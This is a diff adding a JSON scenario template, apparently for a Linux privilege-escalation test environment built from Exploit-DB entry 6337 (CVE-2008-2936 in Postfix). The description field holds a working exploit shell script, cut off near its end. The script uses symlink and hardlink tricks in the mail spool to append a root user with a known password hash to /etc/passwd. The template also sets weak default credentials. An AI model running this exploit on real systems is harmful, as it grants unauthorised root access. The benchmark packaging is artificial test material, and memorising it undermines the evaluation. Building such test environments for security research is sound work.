@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_6337",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Postfix 2.6-20080814 - 'symlink' Local Privilege Escalation (CVE-2008-2936)\n\nExploit source code (6337.sh):\n```\n#!/bin/sh\n#\n# \"rs_pocfix.sh\" (PoC for Postfix local root vulnerability: CVE-2008-2936)\n# by Roman Medina-Heigl Hernandez a.k.a. RoMaNSoFt <roman@rs-labs.com>\n#\n# Tested: Ubuntu / Debian\n#\n# [ Madrid, 30.Aug.2008 ]\n#\n\n# Config\n\nwritable_dir=/tmp\nspool_dir=/var/mail\t\t# Use \"postconf mail_spool_directory\" to obtain this\nuser=root\ntarget=/etc/passwd\nuseful_link=/usr/bin/atq\t# lrwxrwxrwx 2 root root 2 2007-05-04 22:15 /usr/bin/atq -> at\nuseful_link_dst=at\t\t# Tip: find / -type l -uid 0 -print -exec ls -l {} \\; | less\nseconds=3\nuser_in_passwd=\"dsr:3GsXLdEaKaGnM:0:0:root:/root:/bin/sh\"   # Pass is \"dsrrocks\"\npostfix=`which postfix`\t\t# /usr/sbin/postfix\npostconf=/usr/sbin/postconf\npostmap=/usr/sbin/postmap\n\n\n# Funcs\n\nquit()\n{\n  echo \"$1\"\n  exit\n}\n\n\n# Step 1: is my system vulnerable?\n\nhead -n 9 $0 | tail -n 8\nif [ $postfix ] ; then\n  echo \"[*] Postfix seems to be installed\"\nelse\n  quit \"[!] Are you sure Postfix is installed?\"\nfi\n\nmkdir -p $writable_dir/pocfix\ntouch $writable_dir/pocfix/src\nln -s $writable_dir/pocfix/src $writable_dir/pocfix/dst1\nln $writable_dir/pocfix/dst1 $writable_dir/pocfix/dst2\n\nif [ -L $writable_dir/pocfix/dst2 ] ; then\n  echo \"[*] Hardlink to symlink not dereferenced\"\n  rm -rf $writable_dir/pocfix\nelse\n  rm -rf $writable_dir/pocfix\n  quit \"[!] Hardlink to symlink correctly dereferenced. System is not vulnerable\"\nfi\n\nif [ -d $spool_dir -a -w $spool_dir ] ; then\n  echo \"[*] Spool dir is writable\"\nelse\n  quit \"[!] Spool dir is not writable\"\nfi\n\nif [ -e $spool_dir/$user ] ; then\n  rm -f $spool_dir/$user\n  echo \"[*] Mailbox for \\\"$user\\\" found. Trying to delete it\"\n\n  if [ -e $spool_dir/$user ] ; then\n    quit \"[!] Couldn't delete it\"\n  else\n    echo \"[*] Deletion ok\"\n  fi\n\nfi\n\nif [ -e $spool_dir/$useful_link_dst ] ; then\n  rm -f $spool_dir/$useful_link_dst\n  echo \"[*] Mailbox for \\\"$useful_link_dst\\\" found. Trying to delete it\"\n\n  if [ -e $spool_dir/$useful_link_dst ] ; then\n    quit \"[!] Couldn't delete it\"\n  else\n    echo \"[*] Deletion ok\"\n  fi\n\nfi\n\naliases=`$postconf alias_database | cut -d\"=\" -f2`\n$postconf alias_maps | grep -q $aliases\nif [ $? -eq 0 ] ; then\n  if [ $aliases ] ; then\n    $postmap -q $user $aliases > /dev/null\n    if [ $? -eq 0 ] ; then\n      quit \"[!] Mail alias for \\\"$user\\\" exists\"\n    fi\n  fi\nfi\n\nlda=`$postconf mailbox_command | cut -d\"=\" -f2`\nif [ $lda ] ; then\n  quit \"[!] Non-Postfix LDA detected\"\nfi\n\n$postconf home_mailbox | grep -q '/$'\nif [ $? -eq 0 ] ; then\n  quit \"[!] Maildir-style mailbox detected\"\nfi\n\n\n# Step 2: Exploiting\n\nln -f $useful_link $spool_dir/$user 2> /dev/null || quit \"[!] Couldn't create hardlink (different partitions?)\"\nln -s -f $target $spool_dir/$useful_link_dst 2> /dev/null || quit \"[!] Couldn't create symlink pointing to target file\"\ncp -f $target $writable_dir/pocfix_target_backup.$$ && echo \"[*] Backed up: $target (saved as \\\"$writable_dir/pocfix_target_backup.$$\\\")\"\necho \"[*] Sending mail ($seconds seconds wait)\"\necho $user_in_passwd | /usr/sbin/sendmail $user\n\nsleep $seconds\n\ndiff -\n```",
+  "cve": "CVE-2008-2936",
+  "exploitdb_id": "6337",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_6337",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
